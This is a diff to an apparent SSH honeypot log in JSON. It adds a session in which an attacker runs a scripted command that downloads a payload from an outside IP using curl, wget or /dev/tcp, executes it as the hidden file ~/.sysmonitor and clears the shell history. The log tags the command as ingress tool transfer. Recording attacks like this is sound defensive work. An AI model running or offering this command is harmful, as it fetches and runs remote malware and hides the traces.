@@ -543,11 +543,90 @@
           "State": "ExecCompleted",
           "DurationSeconds": 110.1219519
         }
+      },
+      {
+        "Timestamp": "2026-10-17T07:12:30.7968003Z",
+        "Event": "shell_session_start",
+        "Sequence": 31,
+        "ChannelId": "045b4204-b7e0-4b01-8902-879def158de3",
+        "Data": {
+          "RemoteEndpoint": "77.239.124.79:18176",
+          "Username": "fa",
+          "ClientVersion": "SSH-2.0-Go",
+          "SshBanner": "SSH-2.0-OpenSSH_7.2p2 Ubuntu",
+          "State": "ExecOpened",
+          "DurationSeconds": 115.0090874,
+          "TimeToCompromiseMs": 115009
+        }
+      },
+      {
+        "Timestamp": "2026-10-17T07:12:46.1756176Z",
+        "Event": "command",
+        "Sequence": 32,
+        "ChannelId": "045b4204-b7e0-4b01-8902-879def158de3",
+        "ExchangeId": "6bbefb0cba124e4b:000008",
+        "Data": {
+          "RemoteEndpoint": "77.239.124.79:18176",
+          "Username": "fa",
+          "MessageNumber": 8,
+          "ShellMessageNumber": 1,
+          "Command": "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w",
+          "CommandSequenceLatencyMs": 15378,
+          "ActorAutomationHint": "scripted",
+          "DeliveryChannel": "exec",
+          "PayloadUrls": [
+            "http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG"
+          ],
+          "EgressTargets": [
+            "-sSL",
+            "-qO"
+          ],
+          "SemanticComplexity": 85,
+          "AssetValuePerceptionScore": 26,
+          "MitreAttackTechniques": [
+            "Execution",
+            "Command and Control"
+          ]
+        }
+      },
+      {
+        "Timestamp": "2026-10-17T07:12:46.1810144Z",
+        "Event": "command_result",
+        "Sequence": 33,
+        "ChannelId": "045b4204-b7e0-4b01-8902-879def158de3",
+        "ExchangeId": "6bbefb0cba124e4b:000008",
+        "Data": {
+          "RemoteEndpoint": "77.239.124.79:18176",
+          "Username": "fa",
+          "MessageNumber": 8,
+          "ShellMessageNumber": 1,
+          "Command": "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w",
+          "Response": "bash: connect: Connection refused\r\nbash: /dev/tcp/103.160.59.94/28816: Connection refused\r\nchmod: cannot access \u0027/home/remote/.sysmonitor\u0027: No such file or directory",
+          "ResponseSource": "cache",
+          "FailedCommand": true,
+          "ResponseDurationMs": 0,
+          "StandardErrorRatio": 1,
+          "TuringMultiplier": 3.08
+        }
+      },
+      {
+        "Timestamp": "2026-10-17T07:12:46.1838887Z",
+        "Event": "shell_session_end",
+        "Sequence": 34,
+        "ChannelId": "045b4204-b7e0-4b01-8902-879def158de3",
+        "Data": {
+          "RemoteEndpoint": "77.239.124.79:18176",
+          "Username": "fa",
+          "ClientVersion": "SSH-2.0-Go",
+          "SshBanner": "SSH-2.0-OpenSSH_7.2p2 Ubuntu",
+          "State": "ExecCompleted",
+          "DurationSeconds": 130.3961763
+        }
       }
     ],
     "ShellOpened": true,
     "TimeToCompromiseMs": 17745,
-    "CommandCount": 7,
+    "CommandCount": 8,
     "Commands": [
       {
         "Sequence": 4,
@@ -830,15 +909,64 @@
         ],
         "MitreTechnique": "T1059.004 Unix Shell",
         "InferredObjective": "Interactive shell command execution and environment probing"
+      },
+      {
+        "Sequence": 32,
+        "ChannelId": "045b4204-b7e0-4b01-8902-879def158de3",
+        "ExchangeId": "6bbefb0cba124e4b:000008",
+        "MessageNumber": 8,
+        "ShellMessageNumber": 1,
+        "Command": "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w",
+        "Timestamp": "2026-10-17T07:12:46.1756176Z",
+        "CommandSequenceLatencyMs": 15378,
+        "ActorAutomationHint": "scripted",
+        "DeliveryChannel": "exec",
+        "DiscoveryDepthScore": 0,
+        "PersistenceVector": "none",
+        "PayloadUrls": [
+          "http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG"
+        ],
+        "EgressTargets": [
+          "-sSL",
+          "-qO"
+        ],
+        "TunnelingIntent": "none",
+        "PersonaBreakoutAttempt": false,
+        "ReconnaissanceProbe": "none",
+        "SemanticComplexity": 85,
+        "AssetValuePerceptionScore": 26,
+        "HasResponse": true,
+        "ResponseTimestamp": "2026-10-17T07:12:46.1810144Z",
+        "Response": "bash: connect: Connection refused\r\nbash: /dev/tcp/103.160.59.94/28816: Connection refused\r\nchmod: cannot access \u0027/home/remote/.sysmonitor\u0027: No such file or directory",
+        "ResponseDurationMs": 0,
+        "PromptTokens": 0,
+        "CompletionTokens": 0,
+        "BlockedOperation": false,
+        "FailedCommand": true,
+        "LlmModel": "",
+        "ResponseSource": "cache",
+        "HallucinationFeedback": false,
+        "StandardErrorRatio": 1,
+        "SemanticDrift": 0,
+        "TuringMultiplier": 3.08,
+        "MitreAttackTechniques": [
+          "Execution",
+          "Command and Control"
+        ],
+        "MitreTechnique": "T1105 Ingress Tool Transfer",
+        "InferredObjective": "Download external payload, staging script, or crypto-mining binary"
       }
     ],
     "TacticsObserved": [
       "Execution",
-      "Discovery"
+      "Discovery",
+      "Command and Control"
     ],
-    "PayloadUrls": [],
+    "PayloadUrls": [
+      "http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG"
+    ],
     "PersistenceVectors": [],
-    "RiskScore": 44
+    "RiskScore": 76
   },
   {
     "SessionId": "8e9ce6bfcb4d4bc5",
